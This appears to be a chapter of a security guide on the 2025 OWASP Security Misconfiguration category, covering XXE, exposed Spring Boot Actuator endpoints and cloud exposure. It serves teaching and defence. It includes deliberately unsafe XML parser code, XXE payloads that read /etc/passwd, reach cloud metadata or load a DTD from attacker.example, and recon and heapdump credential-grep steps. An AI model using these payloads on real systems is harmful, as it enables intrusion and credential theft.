> **Where it sits in the 2025 list:** #2, up from #5 in 2021 — the biggest jump in this edition. The data is blunt: **100% of tested applications had *some* form of misconfiguration**, with an average incidence rate of **3.00%**, **719,084 occurrences** across the **16 CWEs** in this category, and **1,375 associated CVEs**. Notable CWEs: **CWE-16 (Configuration)** and **CWE-611 (XML External Entity / XXE)**. Average weighted exploit score: **7.96** — the highest exploitability in the top of the list.

---

## 1. Executive Summary

Every application ships with a thousand switches. Debug mode, directory listing, sample apps, default admin accounts, verbose stack traces, permissive CORS, missing security headers, XML parsers that helpfully resolve external entities, cloud buckets that default to "anyone on the internet." Security misconfiguration is what happens when any one of those switches is left in the wrong position.

What makes this category climb to #2 isn't developer incompetence — it's *surface area*. Modern software is configuration-driven to a degree that would have looked absurd a decade ago. Your application's behavior now lives in YAML, Dockerfiles, Terraform, Helm charts, environment variables, cloud IAM policies, and framework defaults, and every one of those is a place to get it wrong. The OWASP data reflects exactly this: as more of an app's behavior shifts into configuration, misconfiguration becomes pervasive.

The category is broad, but the failures cluster into a handful of recurring shapes:

- **Dangerous defaults left on** — sample apps, default credentials, debug endpoints in production.
- **Information leakage** — verbose errors and stack traces that hand attackers your stack, versions, and internal paths.
- **Exposed management surfaces** — Spring Boot Actuator, admin consoles, Kubernetes dashboards, `.git` directories, `.env` files.
- **Missing hardening** — absent security headers, directory listing enabled, unnecessary features installed.
- **XXE** — XML parsers configured to resolve external entities, enabling file disclosure and SSRF.
- **Cloud exposure** — public storage buckets, over-permissive security groups.

If A01 is about *who can do what*, A02 is about *what state you left the system in before anyone even showed up*.

---

## 2. Why It Matters

Misconfiguration is uniquely dangerous because it's often *pre-authentication* and *zero-effort* to exploit. There's no clever payload chain — the attacker just visits a URL that shouldn't exist or reads a bucket that shouldn't be public.

- **Instant credential theft.** An exposed Actuator `/heapdump` or `/env` endpoint can hand over database passwords, API keys, and session tokens directly from JVM memory — no exploitation required.
- **Whole-dataset exposure.** A public S3 bucket doesn't leak one record; it leaks the bucket. Retail and healthcare breaches from open cloud storage have exposed millions of records "without a single line of malicious code written."
- **Recon acceleration.** Verbose stack traces tell an attacker your framework, exact versions, file paths, and sometimes SQL — turning a blind target into a mapped one.
- **XXE to SSRF to compromise.** An XML parser that resolves external entities becomes a file-read primitive and an SSRF pivot into internal services and cloud metadata.
- **Compliance failure.** PCI DSS explicitly requires configuration standards (Req 2.2) and secure hardening; a default credential is an automatic finding.

> 💡 **Field note:** In real assessments the fastest critical findings almost always come from this category. Before I write a single payload, I run exposure checks — `/actuator`, `/.git/`, `/.env`, `/server-status`, default creds. The floor is often lower than the fancy stuff.

---

## 3. How Attackers Exploit It

The methodology is reconnaissance-heavy and exploitation-light:

1. **Fingerprint the stack.** Response headers, error pages, cookie names, and favicon hashes reveal the framework (Spring, Django, Rails, Express) and often the version.
2. **Hunt exposed surfaces.** Fuzz for management endpoints and sensitive files: `/actuator/*`, `/.git/config`, `/.env`, `/phpinfo.php`, `/swagger`, admin consoles, directory listings.
3. **Trigger errors deliberately.** Send malformed input, wrong content types, or oversized values to force stack traces and debug output.
4. **Test defaults.** Try known default credentials on any discovered console (`admin:admin`, vendor defaults).
5. **Probe XML endpoints.** Anywhere the app parses XML (SOAP, SAML, sitemap import, document upload, SVG), test for XXE.
6. **Check the cloud edge.** Enumerate bucket names, test public read/write, check for open security groups and unauthenticated metadata access.
7. **Audit headers and CORS.** Missing `Content-Security-Policy`, `Strict-Transport-Security`, or a reflected `Access-Control-Allow-Origin` with credentials.

The unifying attacker question: *what did the operator forget to turn off?*

---

## 4. Real-World Example

**CVE-2022-22947 — Spring Cloud Gateway Actuator RCE.** When the Actuator endpoint was misconfigured to be publicly exposed, an attacker could POST a crafted SpEL expression to the `gateway/routes` endpoint and achieve remote code execution. The vulnerability itself is a code-injection flaw, but it is *only reachable* because of the misconfiguration — the Actuator management surface being exposed without authentication. It's the canonical example of how a "just monitoring" endpoint becomes a full compromise when hardening is skipped.

**Exposed Actuator → credential theft (bug bounty, verified).** On a disclosed LY Corporation report, insufficient access controls left the Spring Boot Actuator `/heapdump` and `/env` endpoints reachable. The `/heapdump` endpoint dumps JVM memory, and from that memory the researcher recovered admin credentials and user tokens — a clean path from "information disclosure" to account takeover. (HackerOne report #862589.)

**XXE via sitemap import (bug bounty, verified).** Semrush's Site Audit feature accepted a user-supplied `sitemap.xml`, downloaded it, and parsed it with a Java XML parser that resolved external entities — a textbook XXE enabling local file disclosure. (HackerOne report #312543.)

> ⚠️ **Accuracy note:** CVE-2022-22947 and the two HackerOne report numbers above are real and publicly disclosed. Report contents are paraphrased from the public disclosures — read the originals before quoting them.

---

## 5. Root Causes

- **Insecure defaults shipped to production.** Frameworks optimize defaults for developer convenience, not production safety (debug on, verbose errors, permissive CORS).
- **Environment drift.** Dev, QA, and prod configured differently and by hand, so hardening applied in one never reaches another.
- **"Enable everything" mentality.** Management endpoints, sample apps, and unused features left installed because removing them is extra work.
- **No repeatable hardening process.** Configuration done manually and undocumented, impossible to verify or reproduce.
- **Secrets in config.** Static keys embedded in code, config files, or pipelines instead of federated/short-lived credentials.
- **Cloud defaults misunderstood.** Assuming a bucket or resource is private when the provider default (or a well-meaning "make it work" change) opened it.
- **XML parser defaults.** Most XML libraries historically resolved external entities by default; XXE is a *default* problem, not an exotic one.

---

## 6. Vulnerable Code

XXE is the flagship code-level misconfiguration, so here it is across the stack — plus the classic "debug on in prod."

**Node.js — XML parser resolving entities:**
```javascript
const libxml = require("libxmljs2");
app.post("/import", (req, res) => {
  // noent: true expands entities → XXE
  const doc = libxml.parseXml(req.body, { noent: true, noblanks: true });
  res.json({ parsed: doc.root().name() });
});
```

**Java (Spring) — default DocumentBuilderFactory is unsafe:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// No features disabled → external entities resolved → XXE
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(userXml)));
```

**Python — lxml resolving entities:**
```python
from lxml import etree
# resolve_entities defaults to True; no_network isn't enough on its own
parser = etree.XMLParser(resolve_entities=True)
tree = etree.fromstring(user_xml.encode(), parser)
```

**PHP — old-style external entity loading:**
```php
<?php
$dom = new DOMDocument();
// On older libxml, external entities load by default
$dom->loadXML($_POST['xml'], LIBXML_NOENT | LIBXML_DTDLOAD);  // dangerous flags
```

**Config-level — debug and verbose errors in production:**
```python
# Django settings.py shipped to prod
DEBUG = True                 # full stack traces + settings to any visitor
ALLOWED_HOSTS = ["*"]        # host-header abuse
```
```yaml
# Spring Boot application.yml — actuator wide open
management:
  endpoints:
    web:
      exposure:
        include: "*"         # exposes /env, /heapdump, /gateway/routes ...
```

---

## 7. Secure Code

The fix for XXE is always the same shape: **disable DTDs and external entities.**

**Java — hardened parser (OWASP-recommended features):**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**Python — defuse it:**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True,
                         dtd_validation=False, load_dtd=False)
tree = etree.fromstring(user_xml.encode(), parser)
# Or simply: use the `defusedxml` library, which is safe by default.
```

**Node.js — don't expand entities:**
```javascript
const libxml = require("libxmljs2");
const doc = libxml.parseXml(req.body, { noent: false, nonet: true }); // no entity expansion, no network
```

**Go — safe by design (note this):**
```go
// Go's encoding/xml does NOT resolve external entities. Classic XXE
// is not exploitable here — but validate input and cap sizes anyway.
var v Sitemap
if err := xml.Unmarshal(body, &v); err != nil { http.Error(w, "bad xml", 400); return }
```

**Config hardening:**
```yaml
# Spring Boot — expose only health, and secure it
management:
  endpoints:
    web:
      exposure:
        include: "health,info"
  endpoint:
    health:
      show-details: never
```
```python
DEBUG = False
ALLOWED_HOSTS = ["app.example.com"]
```

> 💡 **Tip:** For XXE, prefer a library that's *safe by default* (Python's `defusedxml`, or simply avoid XML for untrusted input where JSON works). Defaults you don't have to remember are the ones that survive turnover.

---

## 8. API Security Perspective

**REST.** APIs leak configuration in three classic ways: verbose error bodies (framework name, versions, SQL), overly generous CORS, and exposed schema/management surfaces. A missing `Content-Type` enforcement invites XXE if the endpoint parses XML it should reject. Auto-generated Swagger/OpenAPI docs left public on production hand attackers a full route map.

```http
GET /api/v3/orders/abc HTTP/1.1

HTTP/1.1 500 Internal Server Error
{ "error": "org.postgresql.util.PSQLException: ERROR: syntax error at ...",
  "stack": "at com.example.OrderRepo.find(OrderRepo.java:42) ..." }   // leaks stack, DB, paths
```

**GraphQL.** Introspection left enabled in production is the signature misconfiguration — it publishes your entire schema, types, and mutations. Verbose GraphQL errors also leak resolver internals. Disable introspection and field suggestions in prod, and return generic errors.

```graphql
query { __schema { types { name fields { name } } } }   # should be disabled in prod
```

---

## 9. Cloud Perspective

Cloud is where misconfiguration turns catastrophic, because a single toggle exposes an entire data store.

**AWS.** Public S3 buckets remain the poster child. Enable **Block Public Access** at the account level, prefer bucket policies over object ACLs, and scan continuously — the gap between deploys is an active exposure window. Lock down security groups (no `0.0.0.0/0` on management ports), and enforce IMDSv2 to blunt SSRF (ties to A01).

**Azure.** Storage account "allow blob public access" and over-broad NSG rules are the equivalent. Disable public blob access by default and use Private Endpoints; audit with Azure Policy.

**GCP.** Buckets granted `allUsers`/`allAuthenticatedUsers`, default service accounts with Editor, and open firewall rules. Use Organization Policy constraints to forbid public buckets outright.

> ⚠️ **Warning:** "It worked in the demo" is how buckets go public. IaC (Terraform/CloudFormation) makes misconfiguration *reproducible* — which cuts both ways. Scan the IaC, not just the running resource.

---

## 10. Microservices Perspective

Microservices multiply the number of things that can be misconfigured, and consistency is the hard part.

- **Config drift across services.** One of forty services ships with debug enabled or an exposed Actuator; the blast radius is the whole mesh.
- **Container defaults.** Running as root, `latest` tags, mounted Docker sockets, and images bloated with build tools and shells.
- **Orchestration exposure.** Kubernetes Dashboard, etcd, or the kubelet API reachable without auth; overly permissive `RBAC` and `NetworkPolicy` absent.
- **Service mesh defaults.** mTLS in "permissive" mode indefinitely, so plaintext service traffic is silently accepted.
- **Fix:** bake hardening into a golden base image and a shared Helm/Kustomize baseline, enforce with admission controllers (OPA Gatekeeper/Kyverno), and treat "one service, one config standard" as non-negotiable.

---

## 11. AI/LLM Perspective

AI code assistants are *misconfiguration machines* when unsupervised, because their training corpus is full of tutorial-grade code where the goal was "make it run," not "ship it safely." Watch for:

- **`DEBUG = True`, `app.run(debug=True)`, `ALLOWED_HOSTS = ["*"]`** — tutorial defaults reproduced verbatim.
- **Permissive CORS** — `Access-Control-Allow-Origin: *` (or reflected origin) with credentials, because it "fixed" a local CORS error.
- **XML parsers with default (unsafe) settings** — the model rarely adds the three feature-disabling lines Java needs.
- **Disabled TLS verification** — `verify=False`, `rejectUnauthorized: false` to "get past" a cert error.
- **Secrets pasted into config** — hardcoded keys in generated `settings.py` or `docker-compose.yml`.

AI *infrastructure* adds a new misconfiguration surface too: self-hosted model-serving endpoints (Ollama, vLLM, inference gateways) left exposed without authentication are the 2025 equivalent of an open Actuator — a management/compute surface reachable by anyone who finds it.

> 💡 **Review habit:** Grep every AI-generated project for `DEBUG`, `verify=False`, `Allow-Origin`, and `*` before it ever reaches a branch. These are five-second checks that catch the most common generated flaws.

---

## 12. Detection

- **Manual testing.** Fingerprint the stack, force errors, and browse for management surfaces. High yield, low effort.
- **Nuclei.** The best tool for this category — the `exposures/`, `misconfiguration/`, and `default-logins/` template sets detect exposed Actuators, `.git`/`.env`, Swagger, phpinfo, and default consoles at scale.
- **ffuf.** Directory/endpoint brute-forcing to find `/actuator`, admin panels, and backup files with a targeted wordlist.
- **OWASP ZAP.** Passive scanner flags missing security headers, cookie flags, and verbose errors; active scan probes for XXE.
- **Semgrep.** Rules for unsafe XML parser construction, `DEBUG=True`, permissive CORS, and disabled TLS verification (`A02:2025`-mapped).
- **CodeQL.** Data-flow queries for XXE (untrusted XML into an unsafe parser) and hardcoded-secret detection.
- **SAST / DAST / IAST.** SAST excels at XXE and hardcoded config; DAST catches exposed surfaces and header gaps; IAST confirms which parser settings actually execute at runtime.
- **IaC & container scanning.** **Trivy**, `checkov`, `kube-bench`, and `kube-hunter` catch misconfig *before* deploy — public buckets, open security groups, root containers, exposed dashboards.
- **Header/TLS scanners.** `testssl.sh`, Mozilla Observatory, `securityheaders.com` for transport and header hardening.

---

## 13. Bug Bounty Tips

**Recon.** Enumerate subdomains widely (`subfinder`, `amass`), resolve live hosts with `httpx`, and fingerprint tech. Misconfigurations hide on forgotten subdomains — staging, `dev-`, `old-`, internal tools accidentally exposed.

**Discovery.** Run `nuclei` with the exposures and misconfiguration templates across the live host list. Fuzz for `/actuator`, `/.git/`, `/.env`, `/swagger`, `/server-status`, backup files. Check every XML-accepting endpoint for XXE.

**Exploitation.** Turn an exposed `/actuator` into impact: `/heapdump` → grep memory for credentials; `/env` → config secrets; `/gateway/routes` (older Spring) → SSRF/RCE. For XXE, escalate from file read to blind/OOB exfiltration and SSRF.

**Escalation.** A `.git` directory → reconstruct source → find hardcoded secrets or a deeper flaw. A verbose stack trace → identify a vulnerable component version → chain to a known CVE. An exposed heapdump → session tokens → account takeover.

**Reporting.** Show the endpoint, the sensitive data retrieved (redacted), and the concrete impact. "Exposed `/heapdump` yielded live admin session token; I authenticated as admin" is a critical; "actuator is public" alone is often informational until you prove the payload.

> 💡 **Payout reality:** Exposed heapdumps, `.git`/`.env` leaks, and XXE-to-file-read are consistently well-paid because impact is demonstrable and undeniable.

---

## 14. Public Bug Bounty Examples (verified)

Real, publicly disclosed reports — paraphrased, not reproduced:

- **XXE via sitemap.xml — Semrush** (HackerOne #312543): the Site Audit feature fetched and parsed a user-supplied `sitemap.xml` with a Java XML parser that resolved external entities, enabling local file disclosure.
- **XXE — Starbucks** (HackerOne #500515): two recruitment `.aspx` pages were vulnerable to XML External Entity injection.
- **XXE — X/Twitter** (HackerOne #248668): the Cloudhopper SXMP servlet on an SMS backend host disclosed local files and could issue web requests (XXE-to-SSRF).
- **Exposed Actuator `/heapdump` & `/env` — LY Corporation** (HackerOne #862589): weak access controls exposed JVM memory, leaking admin credentials and user tokens.
- **Exposed Actuator memory dump — Stripo** (HackerOne #783360): Spring Boot backend left Actuator APIs public across multiple domains.
- **Sensitive Actuator data — Semrush** (HackerOne #1022048): public Actuator endpoints exposed internal tokens and service data.

> ⚠️ **Accuracy note:** These report IDs and their subject matter are drawn from the public HackerOne Hacktivity disclosures. Confirm the current disclosure state and exact details before citing in your own writing.

---

## 15. Payload Examples

For **authorized testing only.**

**Classic XXE — local file read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

**XXE — SSRF pivot to cloud metadata:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>&xxe;</root>
```

**Blind / OOB XXE (parameter entity + external DTD):**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd">
  %ext;
]>
<root>test</root>
```

**Actuator discovery paths:**
```
/actuator            /actuator/env         /actuator/heapdump
/actuator/health     /actuator/mappings    /actuator/gateway/routes
/actuator/httptrace  /actuator/threaddump  /actuator/configprops
```

**Sensitive-file probes:**
```
/.git/config   /.env   /server-status   /phpinfo.php   /swagger-ui.html
```

> ⚠️ **Warning:** Retrieving files or metadata from systems you don't own or aren't authorized to test is a crime. Keep this to labs and in-scope programs.

---

## 16. Automation

- **Nuclei.** Primary engine. `nuclei -t http/exposures/ -t http/misconfiguration/ -t http/default-logins/ -l live_hosts.txt`. Maintain a curated actuator/XXE template set.
- **ffuf.** `ffuf -w actuator-wordlist.txt -u https://TARGET/FUZZ -mc 200,401` to surface management endpoints and gate bypasses.
- **httpx.** Normalize and fingerprint at scale: `httpx -l subs.txt -tech-detect -title -status-code -server`.
- **Python.** Header/CORS audit and heapdump credential-grep automation where generic tools stop.
- **Burp extensions.** Active Scan++ and the built-in scanner for XXE; Retire.js/Software Version Reporter to tie leaked versions to CVEs.
- **Trivy / checkov (CI).** Fail the pipeline on public buckets, open security groups, root containers, and exposed dashboards before deploy.

```bash
# Recon → exposure sweep, one liner
subfinder -d target.com -silent | httpx -silent | \
  nuclei -t http/exposures/ -t http/misconfiguration/ -severity medium,high,critical
```

---

## 17. Prevention Checklist

- [ ] **Repeatable, automated hardening** applied identically to dev/QA/prod (different secrets per environment).
- [ ] **Ship minimal** — remove sample apps, unused features, docs, and default accounts.
- [ ] **Debug off, verbose errors off** in production; central handler returns generic errors.
- [ ] **Lock down management surfaces** — Actuator exposes only `health`/`info`, behind auth/network controls.
- [ ] **XML parsers hardened** — DTDs and external entities disabled everywhere (or use safe-by-default libraries).
- [ ] **Security headers set** — CSP, HSTS, `X-Content-Type-Options`, secure/HttpOnly cookies.
- [ ] **CORS restricted** — explicit allowlist, never reflect origin with credentials.
- [ ] **Cloud storage private by default** — Block Public Access, audit bucket/IAM policies.
- [ ] **Secrets externalized** — federation/short-lived creds, never static keys in code or config.
- [ ] **Automated config verification** in CI (IaC scanning + exposure checks); manual review at least annually if not automated.

---

## 18. Secure Coding Best Practices

1. **Treat configuration as code.** Version it, review it, scan it, and apply it through automation — not by hand on a server.
2. **Secure by default, insecure by explicit choice.** Defaults should be locked down; opening something should require a deliberate, reviewable change.
3. **Separate config from secrets.** Config in the repo; secrets in a vault with short-lived credentials.
4. **Minimize the surface.** Every enabled feature, endpoint, and installed package is attack surface — justify each one.
5. **Fail closed and quiet.** Generic error pages; never leak stack traces, versions, or paths to clients.
6. **Verify continuously.** The gap between deploys is an exposure window — scan running infrastructure, not just pre-deploy.

---

## 19. Interview Questions

**Beginner**
- What is security misconfiguration, and why did it move up to #2 in 2025?
- Why are verbose error messages a security risk?
- What is XXE, and which OWASP category does it live in for 2025?

**Intermediate**
- Walk through exploiting an exposed Spring Boot Actuator `/heapdump`.
- How do you harden a Java `DocumentBuilderFactory` against XXE? Name the features you'd disable.
- Why is a public S3 bucket more dangerous than a single IDOR?

**Advanced**
- Design a repeatable hardening pipeline that keeps dev/QA/prod configuration consistent and verifiable.
- How would you prevent XXE across a polyglot microservices estate with services in Java, Python, and Node?
- Explain how CVE-2022-22947 turns a monitoring endpoint into RCE, and what layered controls would prevent it.

---

## 20. Hands-on Lab

**Objective:** Find, exploit, and fix an exposed management endpoint and an XXE.

**Setup**
- Deploy a deliberately vulnerable Spring Boot app with Actuator wide open (many public training images exist), or use **VAmPI / DVWA / WebGoat** for XXE.
- Proxy through Burp; have `nuclei` and `ffuf` ready.

**Exploitation**
1. `nuclei -t http/exposures/` against the target → discover `/actuator`.
2. Pull `/actuator/env` and `/actuator/heapdump`; grep the heapdump for `password`, `token`, `secret`.
3. On the XXE lab, submit the local-file-read payload from Section 15; confirm file contents returned.

**Fix**
1. Restrict Actuator exposure to `health,info` and put it behind auth/network policy.
2. Harden the XML parser (disable DTDs/external entities) or switch to a safe-by-default library.
3. Re-run `nuclei` and the XXE payload — both should now fail.

> 💡 **Stretch goal:** Add `trivy config` and a `nuclei` exposure scan as a CI gate that fails the build on any high/critical misconfiguration.

---

## 21. Mapping

| Framework | Reference |
|---|---|
| **CWE** | CWE-16 (Configuration), CWE-611 (XXE), CWE-776 (XML Entity Expansion), CWE-489 (Active Debug Code), CWE-526 (Env Var Exposure), CWE-260 (Password in Config File), CWE-614 (Cookie without Secure), CWE-1004 (Cookie without HttpOnly), CWE-942 (Permissive Cross-domain Policy), CWE-315 (Cleartext Cookie Storage) |
| **CAPEC** | CAPEC-1 (Accessing Functionality Not Constrained by ACLs), CAPEC-201 (XML External Entities), CAPEC-541 (Application Fingerprinting), CAPEC-310 (Scanning for Vulnerable Software) |
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing Application), T1592 (Gather Victim Host Information), T1552.001 (Credentials In Files), T1580 (Cloud Infrastructure Discovery) |
| **CVSS** | Ranges from Medium (info disclosure via headers/errors) to Critical (heapdump credential theft, actuator RCE, public bucket). Category avg weighted exploit 7.96. |
| **OWASP ASVS** | V13 Configuration (hardening, secrets, XXE defenses) |
| **NIST SSDF** | PO.5 (secure environments), PW.9 (secure configuration defaults), RV.1 (vulnerability identification) |
| **PCI DSS 4.0** | Req 2.2 (system configuration standards), Req 6.3 (address vulnerabilities), Req 2.2.4 (disable unnecessary services) |

---

## 22. Recommended Tools

| Tool | Use in this category |
|---|---|
| **Nuclei** | Exposure/misconfig/default-login detection at scale (primary) |
| **ffuf** | Brute-forcing management endpoints and hidden files |
| **httpx** | Live-host probing and tech fingerprinting |
| **Burp Suite** (+ Active Scan++) | XXE testing, header/CORS analysis |
| **OWASP ZAP** | Passive header/cookie checks, active XXE scan, CI integration |
| **Semgrep** | Unsafe XML parsers, `DEBUG=True`, permissive CORS, disabled TLS verify |
| **CodeQL** | XXE data-flow and hardcoded-secret queries |
| **Trivy** (+ checkov, kube-bench) | IaC/container/K8s misconfiguration scanning pre-deploy |
| **Gitleaks** | Catch secrets in code/config before they ship |

---

## 23. Key Takeaways

- Misconfiguration hit **#2** because software is now overwhelmingly **configuration-driven** — and **100% of tested apps** had at least one misconfig.
- The highest-value findings are often **pre-auth and effortless**: exposed Actuators, public buckets, `.git`/`.env` leaks, verbose errors.
- **XXE is a *default* problem** — harden every XML parser or use safe-by-default libraries; note that Go's `encoding/xml` is not vulnerable to classic XXE.
- **Scan infrastructure continuously**, not just at deploy — the gap between scans is a live exposure window.
- **AI-generated code reintroduces tutorial defaults** (`DEBUG=True`, `verify=False`, `Allow-Origin: *`) — grep for them before merge.

---

### FAQ

**What is security misconfiguration in simple terms?**
It's leaving a system in an insecure state through its settings — debug mode on, default passwords unchanged, management endpoints exposed, cloud buckets public — rather than through a coding bug. In 2025 it's the #2 risk, found in 100% of tested applications.

**Why did security misconfiguration move from #5 to #2 in OWASP 2025?**
Because modern applications are far more configuration-driven (cloud, containers, IaC, feature flags), so there are vastly more settings to get wrong. Misconfigurations became more prevalent in the contributed data.

**Is XXE part of security misconfiguration in 2025?**
Yes. CWE-611 (XML External Entity) is one of the notable CWEs mapped to A02:2025, because XXE stems from XML parsers configured (often by default) to resolve external entities.

**How do I find exposed Spring Boot Actuator endpoints?**
Enumerate subdomains, probe live hosts, then fuzz for `/actuator` and its sub-paths (`/env`, `/heapdump`, `/mappings`). Nuclei's exposure templates automate this. An exposed `/heapdump` can leak credentials directly from memory.

**What's the fastest way to reduce misconfiguration risk?**
Automate a repeatable hardening baseline applied identically across environments, remove defaults and unused features, disable debug/verbose errors, and add IaC + exposure scanning as a CI gate.
